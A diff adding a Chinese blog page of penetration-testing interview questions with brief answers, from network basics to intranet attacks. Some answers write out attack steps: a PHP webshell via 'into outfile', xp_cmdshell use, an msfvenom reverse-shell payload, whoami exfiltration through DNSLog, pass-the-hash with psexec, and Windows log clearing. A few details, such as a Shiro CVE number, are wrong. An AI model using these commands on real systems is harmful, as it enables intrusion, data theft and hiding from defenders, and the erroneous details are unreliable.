@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' cdnjs.cloudflare.com busuanzi.ibruce.info; style-src 'self' 'unsafe-inline' fonts.googleapis.com cdnjs.cloudflare.com; font-src 'self' fonts.gstatic.com; img-src 'self' data: https:; frame-ancestors 'none'; connect-src 'self' busuanzi.ibruce.info;">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<link rel="preconnect" href="https://cdnjs.cloudflare.com">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="dns-prefetch" href="https://busuanzi.ibruce.info">
+<title>渗透测试面试题集锦：从基础网络到Web安全实战 - Alan's Blog</title>
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" id="prism-theme" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css">
+<script>
+// Theme toggle - light/dark
+function applyTheme(theme) {
+  document.documentElement.setAttribute('data-theme', theme);
+  const prismTheme = document.getElementById('prism-theme');
+  if (theme === 'dark') {
+    prismTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css';
+  } else {
+    prismTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css';
+  }
+  localStorage.setItem('blog-theme', theme);
+}
+function toggleTheme() {
+  const current = document.documentElement.getAttribute('data-theme') || 'light';
+  const next = current === 'light' ? 'dark' : 'light';
+  applyTheme(next);
+}
+// Initialize from localStorage
+document.addEventListener('DOMContentLoaded', function() {
+  const saved = localStorage.getItem('blog-theme');
+  if (saved) {
+    applyTheme(saved);
+  } else {
+    applyTheme('dark');
+  }
+});
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css">
+</head>
+<body>
+<div class="container">
+<header class="header">
+  <a href="../index.html" class="logo"><span class="terminal-icon">></span> Alan's <span class="accent">Blog</span></a>
+  <nav><a href="../index.html">HOME</a><a href="../index.html#articles">ARTICLES</a><a href="../about.html">ABOUT</a><button class="theme-toggle" onclick="toggleTheme()" title="切换主题">&#9788;</button></nav>
+</header>
+<main>
+<article class="article-full">
+  <div class="article-meta reveal">
+    <span class="category-tag">大三下实训</span>
+    <span class="meta-item"><span class="meta-icon">&#128197;</span> 2026-07-06</span>
+    <span class="meta-item"><span class="meta-icon">&#9201;</span> 19 min read</span>
+    <span class="meta-item"><span class="meta-icon">&#9889;</span> <span class="diff-badge" style="background:#00cc88">基础</span></span>
+    <span class="meta-item"><span class="meta-icon">&#128214;</span> <span id="busuanzi_container_page_pv" class="page-reads">阅读 <span id="busuanzi_value_page_pv"></span></span></span>
+  </div>
+  <h1 class="article-title reveal">渗透测试面试题集锦：从基础网络到Web安全实战</h1>
+  <div class="article-body"><h1 style="">渗透测试面试题及简洁答案</h1>
+<h2 style="">一、简单</h2>
+<ul><li><strong>23 端口对应的是什么服务？</strong></li></ul>
+<p style="">答案：Telnet 服务</p>
+<ul><li><strong>1521 端口对应的是什么服务？</strong></li></ul>
+<p style="">答案：Oracle 数据库服务</p>
+<ul><li><strong>请说明 TCP 和 UDP 的区别。</strong></li></ul>
+<p style="">答案：TCP 面向连接、可靠传输；UDP 无连接、不可靠传输</p>
+<ul><li><strong>Linux 系统中，仅发送 4 个 ICMP 包的 ping 命令是什么？</strong></li></ul>
+<p style="">答案：ping -c 4 目标IP</p>
+<ul><li><strong>Linux 系统中，创建文件的常用命令有哪些？</strong></li></ul>
+<p style="">答案：touch 文件名、vi 文件名（保存即创建）</p>
+<ul><li><strong>OSI 七层模型分别是什么？网络层包含哪些常见协议？RDP（远程桌面协议）属于哪一层？其默认端口号是多少？</strong></li></ul>
+<p style="">答案：七层模型：物理层→数据链路层→网络层→传输层→会话层→表示层→应用层；网络层协议：IP、ICMP、ARP；RDP 属应用层，默认端口 3389</p>
+<ul><li><strong>FTP 和 FTPS 有什么区别？</strong></li></ul>
+<p style="">答案：FTP 明文传输数据；FTPS 基于 SSL/TLS 加密传输</p>
+<ul><li><strong>什么是 CSRF 漏洞？其原理是什么？</strong></li></ul>
+<p style="">答案：跨站请求伪造；利用用户已登录身份，诱导执行非本意操作</p>
+<ul><li><strong>CSRF 漏洞的常见防御手段有哪些？</strong></li></ul>
+<p style="">答案：Token 验证、Referer 校验、SameSite Cookie</p>
+<ul><li><strong>什么是 SSRF 漏洞？其原理是什么？</strong></li></ul>
+<p style="">答案：服务器端请求伪造；通过服务端发起对内部 / 指定地址的请求，突破客户端限制</p>
+<ul><li><strong>渗透测试侧重于哪一方面？</strong></li></ul>
+<p style="">答案：发现系统漏洞、评估安全风险、提供修复建议</p>
+<ul><li><strong>请列举 3 个以上常见的 Web 攻击技术。</strong></li></ul>
+<p style="">答案：SQL 注入、XSS、文件上传、命令执行、CSRF</p>
+<ul><li><strong>目录扫描工具有哪些？（列举至少 2 个）</strong></li></ul>
+<p style="">答案：Dirsearch、DirBuster</p>
+<ul><li><strong>Nmap 的常用参数有哪些？（列举至少 3 个并说明用途）</strong></li></ul>
+<p style="">答案：-sP：ping 扫描（探测存活主机）；-p：指定扫描端口；-sV：探测服务版本</p>
+<ul><li><strong>SQLMap 的常用基础参数有哪些？（列举至少 3 个并说明用途）</strong></li></ul>
+<p style="">答案：-u：指定目标 URL；--dbs：列出所有数据库；--tables：列出指定数据库的表</p>
+<ul><li><strong>你接触过哪些安全设备？是否接触过安全监测类设备（如 IDS/IPS、态势感知）？</strong></li></ul>
+<p style="">答案：接触过防火墙、WAF、IDS/IPS、态势感知；接触过安全监测类设备</p>
+<ul><li><strong>你是否使用过态势感知设备？当态势感知产生告警时，如何初步判断告警的真实性？</strong></li></ul>
+<p style="">答案：使用过；查看告警详情（源 IP、payload）、复现测试、结合系统日志验证</p>
+<ul><li><strong>什么是正向代理？什么是反向代理？二者的区别是什么？</strong></li></ul>
+<p style="">答案：正向代理替客户端访问（如 VPN）；反向代理替服务端接收请求（如 Nginx）；区别：代理对象不同（客户端 / 服务端）</p>
+<ul><li><strong>你是否了解手机刷机（刷机）？简要说明其核心目的。</strong></li></ul>
+<p style="">答案：了解；核心目的是替换系统固件，获取更高权限（如 Root）或更换系统版本</p>
+<ul><li><strong>你是否接触过违法网站？（仅需回答 “是” 或 “否”，若 “是” 可简要说明场景但需符合合规性）</strong></li></ul>
+<p style="">答案：否</p>
+<ul><li><strong>渗透测试领域有哪些常见的相关证书或资质编号？（列举至少 2 个）</strong></li></ul>
+<p style="">答案：CISP-PTE、OSCP</p>
+<ul><li><strong>你是否在 SRC（安全响应中心）等平台提交过漏洞？若有，简要说明提交的漏洞类型。</strong></li></ul>
+<p style="">答案：有（或无）；提交过 XSS、SQL 注入漏洞（无则答 “未提交过”）</p>
+<h2 style="">二、中等</h2>
+<ul><li><strong>SQL 注入有哪些常见类型？（至少列举 3 种）</strong></li></ul>
+<p style="">答案：联合查询注入、布尔盲注、延时盲注、报错注入</p>
+<ul><li><strong>如何判断一个 Web 页面是否存在 XSS 漏洞？XSS 漏洞的挖掘思路是什么？</strong></li></ul>
+<p style="">答案：判断：输入&lt;script&gt;alert(1)&lt;/script&gt;，看是否执行弹窗；挖掘：测试所有输入点（表单、URL 参数、评论区）</p>
+<ul><li><strong>什么是越权漏洞？如何判断一个 Web 站点存在垂直越权漏洞（低权限账号能否操作高权限功能）？</strong></li></ul>
+<p style="">答案：越权：低权限账号操作高权限功能；判断：用低权限账号尝试访问高权限接口 / 页面（如 /admin）</p>
+<ul><li><strong>请列举 3 种常见的逻辑漏洞，并说明其核心特点。</strong></li></ul>
+<p style="">答案：①密码找回绕过：验证码可复用；②订单金额篡改：前端修改金额参数生效；③登录爆破防护缺失：无次数限制</p>
+<ul><li><strong>对逻辑漏洞的常规测试思路是什么？</strong></li></ul>
+<p style="">答案：梳理业务流程（登录、支付、找回密码），测试参数篡改、步骤跳过、权限边界</p>
+<ul><li><strong>什么是布尔盲注？其核心原理是什么？</strong></li></ul>
+<p style="">答案：无直接回显，通过 SQL 执行后页面 “正常 / 异常” 判断数据</p>
+<ul><li><strong>延时注入常用的函数有哪些？（列举至少 2 个，说明对应数据库）</strong></li></ul>
+<p style="">答案：MySQL：sleep()；SQL Server：WAITFOR DELAY</p>
+<ul><li><strong>什么是宽字节注入？其适用场景是什么？</strong></li></ul>
+<p style="">答案：利用 GBK 等宽字节编码 “吃掉” 转义符（\）；适用 GBK 编码的 MySQL 数据库</p>
+<ul><li><strong>联合查询注入中用到的 ORDER BY 语句，其原理是什么？</strong></li></ul>
+<p style="">答案：通过调整排序序号（如ORDER BY 3），判断查询结果列数（报错则列数超范围）</p>
+<ul><li><strong>文件上传漏洞中，针对 “黑名单限制” 有哪些常见的绕过方法？</strong></li></ul>
+<p style="">答案：后缀名大小写（.PhP）、后缀截断（.php.）、用备用后缀（.phtml）</p>
+<ul><li><strong>给你一个登录界面（含账号密码输入框），请说明你的渗透测试思路。</strong></li></ul>
+<p style="">答案：①账号密码爆破；②SQL 注入（如&#39; or 1=1#）；③验证码漏洞（复用、绕过）；④记住密码功能测试</p>
+<ul><li><strong>黑盒测试的完整流程是什么？</strong></li></ul>
+<p style="">答案：信息收集→漏洞扫描→漏洞验证→漏洞利用→风险评估→报告输出</p>
+<ul><li><strong>Web 渗透测试中，信息收集的常用手段有哪些？（至少列举 4 种）</strong></li></ul>
+<p style="">答案：WHOIS 查询、子域名枚举、端口扫描、目录扫描、CMS / 中间件指纹识别</p>
+<ul><li><strong>渗透测试的标准流程是什么？请简要描述一个完整项目的渗透过程。</strong></li></ul>
+<p style="">答案：流程：需求确认→信息收集→漏洞探测→漏洞利用→权限提升→内网渗透→清理痕迹→报告提交；过程：先确认测试范围，收集目标 IP / 子域名，扫描漏洞（如 SQL 注入），利用漏洞拿 shell，提权后渗透内网，最后出报告</p>
+<ul><li><strong>你是否做过 Web 渗透测试？主要做黑盒测试还是白盒测试？二者的核心区别是什么？</strong></li></ul>
+<p style="">答案：做过；主要做黑盒（或白盒）；区别：是否接触目标系统源码</p>
+<ul><li><strong>什么是 Redis 未授权访问漏洞？其核心成因是什么？</strong></li></ul>
+<p style="">答案：Redis 未设置密码，可远程连接；成因：默认无认证，配置不当（如绑定 0.0.0.0）</p>
+<ul><li><strong>Mimikatz 工具的主要用途是什么？在 Windows 哪个版本之前可以用它抓取明文密码？哪个版本之后无法直接抓取？</strong></li></ul>
+<p style="">答案：用途：抓取 Windows 明文密码 / 哈希；Win10 1809 版本前可抓明文，之后无法直接抓取</p>
+<ul><li><strong>什么是 Log4j 漏洞（CVE-2021-44228）？其核心利用原理是什么？</strong></li></ul>
+<p style="">答案：Log4j 日志组件漏洞；原理：日志中含 JNDI 字符串，触发远程类加载执行恶意代码</p>
+<ul><li><strong>你是否做过 APP 渗透测试？针对一个普通 APP，简要说明你的渗透测试思路。</strong></li></ul>
+<p style="">答案：做过（或无）；思路：抓包分析接口、反编译看源码、测试权限控制、查敏感数据泄露、测第三方组件漏洞</p>
+<ul><li><strong>APP 测试中，安卓高低版本存在哪些核心差异会影响测试过程？（列举至少 2 点）</strong></li></ul>
+<p style="">答案：①高版本（Android 10+）限制明文传输；②高版本沙盒机制更严格，Root 难度高</p>
+<ul><li><strong>Burp Suite（BP）常用的插件有哪些？（列举至少 2 个并说明用途）</strong></li></ul>
+<p style="">答案：①Intruder：账号密码爆破；②XSS Validator：自动验证 XSS 漏洞</p>
+<ul><li><strong>高版本 Burp Suite（如 2.x 及以上）在抓包功能上与低版本（如 1.x）有哪些主要区别？</strong></li></ul>
+<p style="">答案：支持 HTTPS 默认拦截、UI 界面重构优化、插件兼容性提升</p>
+<ul><li><strong>你是否了解 JS 逆向？Web 站点的 JS 逆向通常针对哪些场景？</strong></li></ul>
+<p style="">答案：了解；场景：登录密码加密、接口参数签名、请求数据加密</p>
+<ul><li><strong>常见的验证码漏洞有哪些类型？（列举至少 2 种）</strong></li></ul>
+<p style="">答案：验证码复用、弱验证码（易被 OCR 识别）</p>
+<ul><li><strong>哪些漏洞可以直接或间接获取网站的 WebShell？（列举至少 3 种）</strong></li></ul>
+<p style="">答案：文件上传漏洞、SQL 注入（--os-shell）、远程命令执行漏洞</p>
+<ul><li><strong>除了蚁剑，你还用过哪些 WebShell 管理工具？它们与蚁剑的核心区别是什么？</strong></li></ul>
+<p style="">答案：用过菜刀、Cknife；区别：菜刀功能老旧，Cknife 支持加密传输防拦截</p>
+<ul><li><strong>你是否接触过钓鱼邮件？钓鱼邮件的常见诱导手段有哪些？</strong></li></ul>
+<p style="">答案：接触过；手段：冒充官方发件人、附件带恶意程序、内嵌钓鱼链接</p>
+<ul><li><strong>什么是水坑攻击？其核心思路是什么？</strong></li></ul>
+<p style="">答案：污染目标用户常访问的站点，待用户访问时触发恶意代码</p>
+<ul><li><strong>你是否做过护网行动？若做过，简要说明你在护网中的角色和主要工作内容。</strong></li></ul>
+<p style="">答案：做过（或无）；角色：蓝方（或红方）；工作：监测告警 / 应急处置（蓝方）、挖掘目标漏洞（红方）</p>
+<ul><li><strong>应急响应中，常用的 Windows 和 Linux 系统排查命令有哪些？（各列举至少 3 个）</strong></li></ul>
+<p style="">答案：Windows：tasklist（查进程）、netstat -ano（查连接）、dir（找异常文件）；Linux：ps aux（查进程）、netstat -tulnp（查连接）、find（找异常文件）</p>
+<ul><li><strong>你会哪些编程语言？是否独立编写过 POC（漏洞验证脚本）或 EXP（漏洞利用脚本）？若有，简要说明场景。</strong></li></ul>
+<p style="">答案：会 Python/Java；写过（或无）；如编写 Log4j 漏洞 POC 验证目标是否存在漏洞</p>
+<h2 style="">三、较难</h2>
+<ul><li><strong>如何绕过 CDN 获取 Web 站点的真实 IP？从国外 Ping 目标的原理是什么？</strong></li></ul>
+<p style="">答案：绕 CDN 方法：查历史 IP、找无 CDN 子域名、分析邮件头；国外 Ping 原理：国外 CDN 节点少，可能直连源 IP</p>
+<ul><li><strong>SQL 注入被 WAF 拦截时，有哪些常见的绕过方法？（列举至少 3 种）</strong></li></ul>
+<p style="">答案：大小写混淆、注释插入（如/*abc*/）、参数污染、URL 编码</p>
+<ul><li><strong>SQLMap 的 --os-shell 参数其核心原理是什么？使用该功能需要满足哪些前提条件？</strong></li></ul>
+<p style="">答案：原理：通过 SQL 注入写脚本到目标服务器，执行脚本获取 shell；前提：有写入权限、知道网站绝对路径、数据库权限足够（如 root）</p>
+<ul><li><strong>针对 MySQL 数据库的 SQL 注入，有哪些具体的利用思路？（至少列举 2 种，含操作步骤）</strong></li></ul>
+<p style="">答案：①联合查询：1. 输入?id=1&#39;判断注入点；2. ORDER BY判列数；3. UNION SELECT列库表；②--os-shell：1. 确认权限 / 路径；2. 执行sqlmap -u 目标 --os-shell写 shell</p>
+<ul><li><strong>针对 MSSQL 数据库的 SQL 注入，有哪些具体的利用思路？（至少列举 2 种，含操作步骤）</strong></li></ul>
+<p style="">答案：①xp_cmdshell：1. 启用xp_cmdshell（exec sp_configure &#39;show advanced options&#39;,1）；2. 执行命令（exec xp_cmdshell &#39;whoami&#39;）；②备份写 shell：1. 备份数据库到网站路径；2. 生成含恶意代码的备份文件</p>
+<ul><li><strong>拿到 phpMyAdmin 权限后，如何通过它获取服务器权限？（列举至少 2 种方法）</strong></li></ul>
+<p style="">答案：①执行 SQL 写 shell（select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; into outfile &#39;网站路径/shell.php&#39;）；②MySQL UDF 提权（创建恶意 UDF 函数执行系统命令）</p>
+<ul><li><strong>什么是 Shiro 反序列化漏洞？Shiro 550（CVE-2016-4437）与 Shiro 721（CVE-2020-1957）两个版本的漏洞有哪些核心区别？</strong></li></ul>
+<p style="">答案：Shiro 框架加密 cookie 可逆，触发反序列化执行代码；区别：550 用默认密钥，721 是密钥泄露 + Padding Oracle 漏洞</p>
+<ul><li><strong>Shiro 反序列化漏洞的流量特征是什么？如何从网络流量中识别该漏洞的攻击行为？</strong></li></ul>
+<p style="">答案：特征：请求头含rememberMe=deleteMe，响应含Set-Cookie: rememberMe；识别：看 cookie 加密特征、检测反序列化 payload</p>
+<ul><li><strong>如何修复 Shiro 反序列化漏洞？（列举至少 2 种有效方案）</strong></li></ul>
+<p style="">答案：升级 Shiro 到安全版本、替换随机密钥、禁用rememberMe功能</p>
+<ul><li><strong>什么是 Fastjson 漏洞？其核心利用思路是什么？</strong></li></ul>
+<p style="">答案：Fastjson 解析 JSON 时触发反序列化漏洞；思路：构造含@type的 JSON，指向恶意类执行代码</p>
+<ul><li><strong>了解哪些常见的中间件漏洞？（列举至少 3 种，说明对应中间件及漏洞成因）</strong></li></ul>
+<p style="">答案：①Apache Struts2 S2-045：OGNL 表达式执行，参数处理漏洞；②Nginx 解析漏洞：路径含.php，静态文件当 PHP 解析；③Tomcat 弱口令：后台弱密码可部署 war 包拿 shell</p>
+<ul><li><strong>了解哪些 Java 中间件漏洞？（列举至少 2 种，说明利用场景）</strong></li></ul>
+<p style="">答案：①Tomcat 后台部署 war 包：弱口令登录 /manager，传 war 包拿 shell；②WebLogic T3 反序列化：利用 T3 协议执行恶意代码，攻击 WebLogic 服务</p>
+<ul><li><strong>JNDI 注入漏洞常用的协议有哪些？（列举至少 3 种）</strong></li></ul>
+<p style="">答案：LDAP、RMI、DNS</p>
+<ul><li><strong>什么是文件上传的 “二次渲染绕过”？其适用场景和操作思路是什么？</strong></li></ul>
+<p style="">答案：目标对上传文件二次处理（如图片压缩），在未处理区域插恶意代码；场景：图片上传；思路：传正常图片，尾部加 PHP 代码，看渲染后代码是否保留</p>
+<ul><li><strong>WAF 因 “数据过长” 拦截请求时，有哪些绕过方法？</strong></li></ul>
+<p style="">答案：分块传输（Chunked Encoding）、参数拆分、压缩请求体</p>
+<ul><li><strong>你是否接触过内网渗透？内网渗透的完整流程是什么？</strong></li></ul>
+<p style="">答案：接触过；流程：边界突破→内网信息收集→横向移动→权限提升→域渗透→权限维持→报告</p>
+<ul><li><strong>若客户不让使用扫描器，如何通过纯手工测试发现 Web 漏洞？（以 SQL 注入为例说明）</strong></li></ul>
+<p style="">答案：1. 测试输入点（如?id=1&#39;）看是否报错；2. 输入?id=1 and 1=1（正常）、?id=1 and 1=2（异常），判断存在注入</p>
+<ul><li><strong>你是否通过纯手工测试发现过漏洞？若有，简要说明漏洞类型和测试过程。</strong></li></ul>
+<p style="">答案：有；如 XSS：测试评论区输入&lt;script&gt;alert(1)&lt;/script&gt;，页面弹出弹窗</p>
+<ul><li><strong>在客户现场进行渗透测试时，若仅能进行内网渗透，你的核心测试思路是什么？</strong></li></ul>
+<p style="">答案：1. 扫描内网存活主机 / 端口；2. 探测漏洞（如 MS17-010）；3. 横向移动（哈希传递）；4. 定位域控并获取权限</p>
+<ul><li><strong>什么是进程注入？Windows 系统中进程注入的常见方式有哪些？（列举至少 2 种）</strong></li></ul>
+<p style="">答案：将恶意代码注入其他进程内存执行；方式：CreateRemoteThread、APC 注入</p>
+<ul><li><strong>什么是内存马？其核心特点和常见类型是什么？</strong></li></ul>
+<p style="">答案：注入进程内存的恶意代码；特点：无文件、难检测；类型：Servlet 内存马、Filter 内存马</p>
+<ul><li><strong>代码审计的具体流程是什么？如何结合工具和人工找到漏洞位置？</strong></li></ul>
+<p style="">答案：流程：环境搭建→代码通读→工具扫描→人工复核；找漏洞：工具（如 FindSecBugs）初筛，人工分析敏感代码（如 SQL 拼接处）</p>
+<ul><li><strong>你是否独立完成过 APK 或小程序的渗透测试？若测试过程中无法做到 “完美覆盖”，你的处理思路是什么？</strong></li></ul>
+<p style="">答案：独立完成过；思路：优先测高危点（登录、支付），记录未覆盖点并说明原因，提优化建议</p>
+<ul><li><strong>测试 APK 或小程序时，若遇到抓不到包的情况，有哪些解决方法？</strong></li></ul>
+<p style="">答案：配置手机代理连 BP、安装系统证书、Frida hook 绕过证书校验</p>
+<ul><li><strong>测试金融行业（如银行）的 APK / 小程序时，因防护严格抓不到包，如何突破？（列举至少 2 种方案）</strong></li></ul>
+<p style="">答案：Frida hook SSL 校验函数、反编译修改源码（去证书校验）重打包</p>
+<ul><li><strong>Frida 和 Xposed 框架的核心用途是什么？在 APK 测试中如何使用它们？</strong></li></ul>
+<p style="">答案：Frida：动态插桩，hook 加密 / 校验函数；Xposed：静态 hook，改 APP / 系统行为；使用：Frida hook 登录密码加密，Xposed 禁用证书校验</p>
+<ul><li><strong>什么是 NTLM 哈希？其在 Windows 认证中的作用是什么？</strong></li></ul>
+<p style="">答案：Windows 存储的用户密码哈希；作用：认证时无需传明文，用哈希验证身份</p>
+<ul><li><strong>Linux 系统中，除了内核提权，还有哪些常见的提权方式？（列举至少 2 种）</strong></li></ul>
+<p style="">答案：SUID 提权（利用有 SUID 权限的命令如 find）、计划任务提权（修改可写的计划任务脚本）</p>
+<ul><li><strong>什么是 “脏牛” 提权（CVE-2016-5195）？其核心原理是什么？</strong></li></ul>
+<p style="">答案：Linux 内核提权漏洞；原理：利用写时复制漏洞，绕过内存权限检查修改只读数据（如 /etc/passwd）</p>
+<ul><li><strong>Windows 系统的加固措施中，用户策略和 ACL 策略分别如何配置才能提升安全性？（各列举 2 点）</strong></li></ul>
+<p style="">答案：用户策略：①禁用 Guest 账户；②开启密码复杂度要求；ACL 策略：①限制普通用户修改系统文件；②给 C:\Windows\System32 设只读权限</p>
+<h2 style="">四、困难</h2>
+<ul><li><strong>当 RCE（远程命令执行）漏洞没有命令回显时，如何解决？（列举至少 2 种方案，含详细操作思路）</strong></li></ul>
+<p style="">答案：①DNSLog：执行ping 随机字符串.dnslog.cn，查 DNSLog 平台是否有记录；②写文件：执行echo &#39;test&#39; &gt; /tmp/test，后续访问 /tmp/test 确认</p>
+<ul><li><strong>利用 Redis 未授权访问漏洞最终能达到什么效果？能否拿到服务器权限？通过 Redis 漏洞的哪些功能可以实现权限获取？</strong></li></ul>
+<p style="">答案：效果：写文件、执行命令；能拿服务器权限；通过写 crontab 定时任务、写 ssh 公钥、写网页文件实现</p>
+<ul><li><strong>测试 MS17-010（永恒之蓝）漏洞时，若 Kali 提示 “仅允许执行 32 位 payload，无 64 位”，如何解决？若漏洞利用成功但频繁刷 Shell 信息却无法回弹终端，可能的原因是什么？</strong></li></ul>
+<p style="">答案：解决：生成 32 位 payload（msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=端口 -f exe -o 32.exe）；原因：目标防火墙拦截端口、payload 与系统不兼容</p>
+<ul><li><strong>Shiro 反序列化漏洞利用时，若目标不出网，如何解决？（列举至少 2 种方案）</strong></li></ul>
+<p style="">答案：①搭建内网 LDAP/RMI 服务，指向恶意类；②本地生成 payload，通过反序列化在目标本地执行</p>
+<ul><li><strong>命令执行漏洞利用时，若目标不出网且无回显，如何通过 DNSLog 验证命令执行结果？</strong></li></ul>
+<p style="">答案：1. 注册 DNSLog 域名（如xxx.dnslog.cn）；2. 执行ping -c 1 $(whoami).xxx.dnslog.cn；3. 刷新 DNSLog 平台，查看是否有含当前用户的记录</p>
+<ul><li><strong>什么是黄金票据？什么是白银票据？二者的核心区别、适用场景及利用条件是什么？</strong></li></ul>
+<p style="">答案：黄金票据：伪造 TGT；白银票据：伪造 TGS；区别：黄金可访问所有服务，白银仅指定服务；场景：黄金控域，白银访问特定服务；条件：黄金需域管 hash、KRBTGT hash；白银需服务账户 hash、服务名</p>
+<ul><li><strong>什么是哈希传递（Pass-the-Hash）攻击？其核心原理是什么？如何在实战中利用？</strong></li></ul>
+<p style="">答案：用 NTLM 哈希代替明文密码登录；原理：Windows 认证用哈希验证；利用：mimikatz 导出 hash，psexec \\IP -u 用户名 -p hash 命令登录</p>
+<ul><li><strong>内网渗透中，常见的隧道搭建方式有哪些？（列举至少 3 种，说明适用场景）</strong></li></ul>
+<p style="">答案：①SSH 隧道：有 SSH 权限，转发端口；②FRP 隧道：内外网通，反向代理内网端口；③ICMP 隧道：禁 TCP/UDP，用 ICMP 传数据</p>
+<ul><li><strong>若已获取域内某台主机的权限，如何进一步获取域控制器（DC）的权限？（列举至少 2 种攻击路径）</strong></li></ul>
+<p style="">答案：①哈希传递到 DC（用域管 hash 通过 psexec 登录）；②伪造黄金票据，获取 DC 访问权限</p>
+<ul><li><strong>内网权限维持的常用方法有哪些？Windows 系统中留后门的常见绝对路径是什么？（列举至少 2 个）</strong></li></ul>
+<p style="">答案：方法：创建隐藏账户、计划任务后门、注册表启动项；路径：C:\Windows\System32\spool\drivers\color\、C:\Users\Public\</p>
+<ul><li><strong>权限维持时，除了留后门，还需要做哪些操作以避免被发现？（列举至少 3 点）</strong></li></ul>
+<p style="">答案：①清理系统日志（wevtutil cl Security）；②隐藏进程 / 文件；③加密通信流量</p>
+<ul><li><strong>Windows 系统中，“快捷方式劫持” 漏洞的核心原理是什么？如何利用该漏洞实现权限维持？</strong></li></ul>
+<p style="">答案：原理：修改快捷方式目标路径，添加恶意程序；利用：修改常用软件快捷方式（如 Chrome），目标设为 “恶意程序 &amp;&amp; 原路径”，用户点击触发</p>
+<ul><li><strong>你是否有溯源成功的经历？若目标没有部署蜜罐，如何进行攻击溯源？（列举至少 3 种关键手段）</strong></li></ul>
+<p style="">答案：有（或无）；手段：分析系统 / Web 日志找源 IP，逆向恶意文件查 C2，查异常网络连接</p>
+<ul><li><strong>在蓝方（防御方）工作时，如何处置恶意流量？针对 DNSLog 攻击、冰蝎 Webshell 攻击，如何识别并阻断？</strong></li></ul>
+<p style="">答案：处置：阻断源 IP / 端口、过滤恶意 payload；DNSLog 识别：监测异常 DNS 请求，阻断到 DNSLog 平台连接；冰蝎识别：看加密流量 / 特定请求头，阻断特征流量</p>
+<ul><li><strong>若中了勒索病毒，如何探查被加密文件的来源？（列举至少 3 种排查方向）</strong></li></ul>
+<p style="">答案：①查系统日志找异常进程 / 文件创建时间；②查网络连接找下载恶意文件的 IP；③查邮件附件 / U 盘外设</p>
+<ul><li><strong>Windows 系统发生安全事件时，如何开展应急响应？（含系统排查、恶意文件处理、日志分析步骤）</strong></li></ul>
+<p style="">答案：1. 隔离主机（断网）；2. 系统排查：tasklist查进程、netstat查连接；3. 恶意文件：删除 / 隔离，上传分析；4. 日志分析：wevtutil导出日志，找攻击行为；5. 修复漏洞，恢复数据</p>
+<ul><li><strong>若客户现场仅你一人，态势感知突然产生高危告警，你的应急处置流程是什么？（需包含告警验证、风险控制、溯源分析步骤）</strong></li></ul>
+<p style="">答案：1. 告警验证：看详情，远程登录目标确认攻击；2. 风险控制：断网隔离，阻断源 IP；3. 溯源分析：查日志 / 进程 / 连接，找攻击路径；4. 处置：删恶意文件，修复漏洞；5. 上报 + 记录</p>
+<ul><li><strong>在红蓝对抗中，你通常担任什么角色？若担任蓝方值守，发生安全事件时如何开展应急？</strong></li></ul>
+<p style="">答案：角色：蓝方（或红方）；蓝方应急：①监测告警；②验证告警；③阻断攻击；④溯源分析；⑤修复 + 复盘</p>
+<ul><li><strong>资产梳理的核心依据是什么？（列举至少 3 个维度）</strong></li></ul>
+<p style="">答案：IP 段划分、设备类型（服务器 / 终端）、业务系统（Web/APP）、资产归属部门</p>
+<ul><li><strong>网络安全风险评估的核心维度有哪些？（列举至少 4 个）</strong></li></ul>
+<p style="">答案：资产价值、漏洞严重程度、威胁可能性、影响范围、现有防护措施</p>
+<ul><li><strong>远控木马（如 CS）的流量特征是什么？CS 中 “有阶段 payload” 和 “无阶段 payload” 的区别是什么？</strong></li></ul>
+<p style="">答案：特征：加密传输、不规则数据包；区别：有阶段分阶段传（先 loader 再完整 payload，易绕检测）；无阶段一次性传（快但易被查）</p>
+<ul><li><strong>FRP 工具是正向代理还是反向代理？如何利用 FRP 实现内网穿透（需说明服务端、客户端配置核心思路）？</strong></li></ul>
+<p style="">答案：反向代理；配置：①服务端（公网）：frps.ini 设bind_port（监听端口）；②客户端（内网）：frpc.ini 设server_addr（服务端 IP）、remote_port（公网映射端口）、local_port（内网服务端口）；启动后访问公网 IP:remote_port 连内网服务</p>
+<ul><li><strong>你是否做过内网渗透项目？若有，简要说明你在项目中的核心工作及成果（如拿下的权限、发现的风险点）</strong></li></ul>
+<p style="">答案：做过；工作：边界突破（文件上传拿 shell）、内网扫描、横向移动（哈希传递）；成果：拿下域控权限，发现 12 个漏洞，提加固建议</p>
+<ul><li><strong>什么是 IPS？什么是 IDS？二者的核心区别及适用场景是什么？</strong></li></ul>
+<p style="">答案：IDS：入侵检测，仅监测告警；IPS：入侵防御，监测 + 阻断；区别：是否主动阻断攻击；场景：IDS 用于审计，IPS 用于实时防护</p></div>
+</article>
+</main>
+<footer class="footer">
+  <p>&copy; 2026 Alan's Blog. Powered by curiosity.</p>
+</footer>
+<div class="back-to-top" id="backToTop">▲</div>
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-cpp.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
